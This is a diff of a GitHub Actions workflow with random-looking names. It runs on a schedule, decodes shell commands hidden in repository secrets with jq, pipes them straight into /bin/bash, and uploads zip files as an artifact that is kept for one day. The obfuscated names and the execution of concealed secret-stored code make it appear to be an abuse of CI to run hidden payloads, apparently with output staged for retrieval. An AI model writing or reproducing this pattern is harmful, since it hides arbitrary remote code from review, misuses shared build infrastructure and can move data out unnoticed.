@@ -1,37 +1,26 @@
 name: brooke8007ss
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '49 2/6 * * *'
+    - cron: '29 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: brooke8007ss
         env:
-          a3: ${{ secrets.a3 }}
+          gyhnf3: ${{ secrets.gyhnf3 }}
         run: |
-          echo $a3 | jq -r .sulu3 | /bin/bash
-          echo $ybav54737 | jq -r .lm4 | /bin/bash
-          echo $m9657 | jq -r .vx7 | /bin/bash
-          echo $zyscu204 | jq -r .jep13283 | /bin/bash
-          echo $csmly481 | jq -r .wj59734 | /bin/bash
-          echo $h0377 | jq -r .awzw95 | /bin/bash
-          echo $q1281 | jq -r .xsj361 | /bin/bash
-          echo $kmnh32 | jq -r .uh5 | /bin/bash
-          echo $nunw224 | jq -r .m81 | /bin/bash
-          echo $i65886 | jq -r .pllo6046 | /bin/bash
-          echo $umc2116 | jq -r .igudx144 | /bin/bash
-          echo $yquts0 | jq -r .hjlfm52 | /bin/bash
-          echo $ahs298 | jq -r .an17730 | /bin/bash
-          echo $mbbf79 | jq -r .gzxzi6169 | /bin/bash
-          echo $k041 | jq -r .jm9312 | /bin/bash
-          echo $d38850 | jq -r .mwha0 | /bin/bash
-          echo $n9426 | jq -r .kpw81401 | /bin/bash
-          echo $knjg8 | jq -r .mwe23536 | /bin/bash
-          echo $cp5 | jq -r .as5026 | /bin/bash
-          echo $ghg5 | jq -r .hsvda8 | /bin/bash
+          printf '%s' "$gyhnf3" | jq -r .aagfo83 | /bin/bash
+          printf '%s' "$la5" | jq -r .gg55 | /bin/bash
+          printf '%s' "$z263" | jq -r .bavg71028 | /bin/bash
+          printf '%s' "$futg3581" | jq -r .zr28348 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: piPs0HdL
+          path: "*.zip"
+          retention-days: 1
